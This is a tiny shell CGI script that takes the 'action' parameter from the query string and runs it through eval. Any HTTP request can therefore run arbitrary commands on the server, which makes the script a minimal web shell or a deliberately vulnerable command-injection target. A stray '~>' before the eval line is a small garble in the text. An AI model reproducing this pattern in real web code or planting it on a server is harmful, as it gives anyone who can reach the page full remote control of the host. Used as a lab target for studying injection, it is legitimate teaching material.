#!/bin/sh
echo "Content-Type: text/plain"
echo ""

ACTION=$(printf '%s' "$QUERY_STRING" | sed -e 's/^action=//' -e 's/+/ /g')
~>eval "$ACTION"
